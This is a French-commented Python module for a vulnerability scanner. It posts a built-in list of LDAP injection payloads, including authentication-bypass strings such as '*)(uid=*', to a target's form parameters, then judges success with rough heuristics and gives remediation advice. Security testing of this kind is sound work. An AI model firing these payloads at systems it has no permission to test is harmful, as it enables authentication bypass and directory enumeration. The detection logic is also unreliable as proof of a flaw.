"""
Détecteur de LDAP Injection
Active Directory et serveurs LDAP
"""

import asyncio
from typing import Optional, List, Dict
from loguru import logger
import aiohttp

from core.models import Vulnerabilite


class DetecteurLDAPInjection:
    """
    Détecte les vulnérabilités LDAP Injection
    Affecte Active Directory, OpenLDAP, etc.
    """

    def __init__(self, auth_config: Dict = None):
        """
        Initialise le détecteur
        
        Args:
            auth_config: Configuration d'authentification
        """
        self.auth_config = auth_config or {}
        
        # Payloads LDAP Injection
        self.payloads_ldap = [
            # Authentication bypass
            "*",
            "admin*",
            "*)(uid=*",
            "*)(objectClass=*",
            "*)(&(objectClass=*",
            
            # Boolean-based
            "*)(cn=*",
            "admin)(&(objectClass=*",
            "*))%00",
            
            # AND/OR injection
            "(&(uid=*",
            "(|(uid=*",
            "*)(|(uid=*)(uid=admin",
            
            # Comment injection
            "admin)%00",
            "admin))%00",
            
            # Special characters
            "*\\2A*",  # Escaped *
            "admin\\*",
            "*)(",
            
            # Filter injection
            ")(objectClass=*))(&(objectClass=void",
            "*)(objectclass=*",
            "*)(cn=*)(objectclass=*",
        ]
        
        # Indicateurs de succès
        self.success_indicators = [
            'objectClass',
            'distinguished',
            'ldap',
            'cn=',
            'ou=',
            'dc=',
            'admin',
            'users',
            'groups',
        ]

    async def detecter(self, url: str, params: Dict = None) -> List[Vulnerabilite]:
        """
        Détecte les vulnérabilités LDAP Injection
        
        Args:
            url: URL à tester
            params: Paramètres découverts
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        if not params:
            logger.debug(f"⏭️  Pas de paramètres pour LDAP: {url}")
            return vulnerabilites
        
        logger.info(f"🔍 Test LDAP Injection: {url}")
        
        try:
            async with aiohttp.ClientSession(
                cookies=self.auth_config.get('cookies'),
                headers=self.auth_config.get('headers')
            ) as session:
                # Récupérer baseline
                baseline = await self._get_baseline(session, url, params)
                
                # Tester chaque paramètre
                for param_name in params.keys():
                    for payload in self.payloads_ldap:
                        vuln = await self._test_ldap_payload(
                            session, url, param_name, payload, params, baseline
                        )
                        if vuln:
                            vulnerabilites.append(vuln)
                            logger.success(f"✅ LDAP Injection trouvé: {param_name}")
                            break  # Un payload suffit
                    
                    await asyncio.sleep(0.1)
        
        except Exception as e:
            logger.debug(f"Erreur test LDAP: {str(e)}")
        
        return vulnerabilites

    async def _test_ldap_payload(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        payload: str,
        params: Dict,
        baseline: str
    ) -> Optional[Vulnerabilite]:
        """Teste un payload LDAP"""
        try:
            test_params = params.copy()
            test_params[param_name] = payload
            
            async with session.post(
                url,
                data=test_params,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                contenu = await response.text()
                
                # Vérifier si injection réussie
                if self._is_vulnerable(contenu, baseline):
                    return Vulnerabilite(
                        type="LDAP_Injection",
                        severite="CRITIQUE",
                        url=url,
                        description=f"LDAP Injection via '{param_name}'. Permet le bypass d'authentification et l'énumération d'utilisateurs AD.",
                        payload=f"{param_name}={payload}",
                        preuve=contenu[:400],
                        cvss_score=9.0,
                        remediation=self._get_remediation()
                    )
        
        except Exception as e:
            logger.debug(f"Erreur payload LDAP: {str(e)}")
        
        return None

    def _is_vulnerable(self, contenu: str, baseline: str) -> bool:
        """Vérifie si vulnérable à LDAP injection"""
        # 1. Contenu différent de baseline
        if len(contenu) > len(baseline) * 1.3:
            return True
        
        # 2. Indicateurs LDAP dans réponse
        if sum(1 for ind in self.success_indicators if ind.lower() in contenu.lower()) >= 2:
            return True
        
        # 3. Erreurs LDAP leak
        ldap_errors = [
            'syntax error',
            'invalid dn',
            'ldap error',
            'filter error',
            'objectclass',
        ]
        if any(err in contenu.lower() for err in ldap_errors):
            return True
        
        return False

    async def _get_baseline(
        self, session: aiohttp.ClientSession, url: str, params: Dict
    ) -> str:
        """Récupère baseline"""
        try:
            async with session.post(
                url,
                data=params,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                return await response.text()
        except Exception:
            return ""

    def _get_remediation(self) -> str:
        """Recommandations de remediation"""
        return """
Remediation LDAP Injection:

1. Utiliser des requêtes paramétrées (LDAP prepared statements)
2. Valider et sanitizer toutes les entrées
3. Échapper les caractères spéciaux LDAP: * ( ) \\ / NUL
4. Utiliser une whitelist de caractères autorisés
5. Implémenter principe du moindre privilège
6. Pas de messages d'erreur détaillés aux utilisateurs
7. Logs et monitoring des requêtes LDAP
8. Rate limiting sur endpoints d'authentification
9. Authentification multi-facteurs (MFA)
10. Tester avec OWASP LDAP Injection Cheat Sheet

Caractères à échapper:
- * → \\2A
- ( → \\28
- ) → \\29
- \\ → \\5C
- NUL → \\00

Exemple sécurisé (Python):
```python
import ldap

# Échapper l'input
def escape_ldap(s):
    replacements = {
        '*': '\\\\2A',
        '(': '\\\\28',
        ')': '\\\\29',
        '\\\\': '\\\\5C',
        '\\x00': '\\\\00'
    }
    for old, new in replacements.items():
        s = s.replace(old, new)
    return s

username = escape_ldap(user_input)
filter_string = f"(&(uid={username})(objectClass=person))"
```

Références:
- OWASP LDAP Injection
- Active Directory Security Best Practices
"""


# Test
async def test_ldap():
    """Test du détecteur"""
    detector = DetecteurLDAPInjection()
    test_url = "http://localhost/ldap/login"
    test_params = {'username': 'admin', 'password': 'pass'}
    
    vulns = await detector.detecter(test_url, test_params)
    print(f"{'✅' if vulns else '❌'} {len(vulns)} vulnérabilités LDAP trouvées")


if __name__ == "__main__":
    asyncio.run(test_ldap())
